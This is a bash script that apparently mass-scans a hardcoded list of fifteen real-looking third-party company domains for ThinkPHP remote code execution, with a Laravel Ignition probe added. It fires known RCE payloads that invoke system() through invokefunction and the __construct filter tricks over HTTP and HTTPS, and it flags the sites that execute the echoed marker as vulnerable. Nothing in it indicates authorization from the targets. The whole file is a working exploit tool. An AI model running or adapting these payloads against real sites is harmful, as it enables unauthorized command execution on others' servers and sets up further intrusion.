#!/bin/bash
DOMAINS="bjhzsv.com bjry168.com www.joyalltire.com www.joyalltire.cn hongguanjixie.com shimingchina.com longjoe.com shanguoying.com shicone.com nbzhongxin.net ihlsx.com llhyd.com sxyspos.com dnsthy.com yzsci.com"

echo "============================================"
echo "ThinkPHP RCE Scan v2 (with -g globoff)"
echo "============================================"

for domain in $DOMAINS; do
    # P1: Standard payload
    body1=$(curl -s -g -m 5 --max-time 5 "http://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TPRCEOK" 2>/dev/null)
    # Check if TPRCEOK appears STANDALONE (not inside URL reflection)
    standalone=$(echo "$body1" | grep -o "TPRCEOK" | grep -v "echo%20TPRCEOK" | head -1)
    if [ -n "$standalone" ] && ! echo "$body1" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] P1 - CONTAINS STANDALONE TPRCEOK!"
    elif echo "$body1" | grep -q "TPRCEOK"; then
        echo "FALSE-POS [$domain] P1 - TPRCEOK only in URL reflection"
    else
        echo "SAFE     [$domain] P1"
    fi

    # P2: __construct with filter[]
    body2=$(curl -s -g -m 5 --max-time 5 "http://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&get[]=echo%20TPRCEOK" 2>/dev/null)
    standalone2=$(echo "$body2" | grep -o "TPRCEOK" | grep -v "echo%20TPRCEOK" | head -1)
    if [ -n "$standalone2" ] && ! echo "$body2" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] P2 - CONTAINS STANDALONE TPRCEOK!"
    elif echo "$body2" | grep -q "TPRCEOK"; then
        echo "FALSE-POS [$domain] P2 - TPRCEOK only in URL reflection"
    else
        echo "SAFE     [$domain] P2"
    fi

    # P3: __construct with set[]
    body3=$(curl -s -g -m 5 --max-time 5 "http://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&set[]=echo%20TPRCEOK" 2>/dev/null)
    standalone3=$(echo "$body3" | grep -o "TPRCEOK" | grep -v "echo%20TPRCEOK" | head -1)
    if [ -n "$standalone3" ] && ! echo "$body3" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] P3 - CONTAINS STANDALONE TPRCEOK!"
    elif echo "$body3" | grep -q "TPRCEOK"; then
        echo "FALSE-POS [$domain] P3 - TPRCEOK only in URL reflection"
    else
        echo "SAFE     [$domain] P3"
    fi

    # P4: Laravel
    http_code4=$(curl -s -g -m 5 --max-time 5 -o /dev/null -w "%{http_code}" "http://$domain/_ignition/execute-solution" 2>/dev/null)
    body4=$(curl -s -g -m 5 --max-time 5 "http://$domain/_ignition/execute-solution" 2>/dev/null)
    if [ "$http_code4" != "000" ] && [ -n "$http_code4" ]; then
        echo "LARAVEL  [$domain] P4 - HTTP $http_code4 (size: $(echo "$body4" | wc -c))"
    else
        echo "NO-LARAVEL [$domain] P4"
    fi
done

echo ""
echo "=== HTTPS scan ==="
for domain in $DOMAINS; do
    body1=$(curl -s -g -m 5 --max-time 5 -k "https://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TPRCEOK" 2>/dev/null)
    if echo "$body1" | grep -q "TPRCEOK" && ! echo "$body1" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] HTTPS P1 - STANDALONE TPRCEOK!"
    fi
    body2=$(curl -s -g -m 5 --max-time 5 -k "https://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&get[]=echo%20TPRCEOK" 2>/dev/null)
    if echo "$body2" | grep -q "TPRCEOK" && ! echo "$body2" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] HTTPS P2 - STANDALONE TPRCEOK!"
    fi
    body3=$(curl -s -g -m 5 --max-time 5 -k "https://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&set[]=echo%20TPRCEOK" 2>/dev/null)
    if echo "$body3" | grep -q "TPRCEOK" && ! echo "$body3" | grep -q "请求的 URL\|Requested URL\|echo%20TPRCEOK"; then
        echo "VULNERABLE! [$domain] HTTPS P3 - STANDALONE TPRCEOK!"
    fi
done

echo ""
echo "============================================"
echo "SCAN COMPLETE"
echo "============================================"
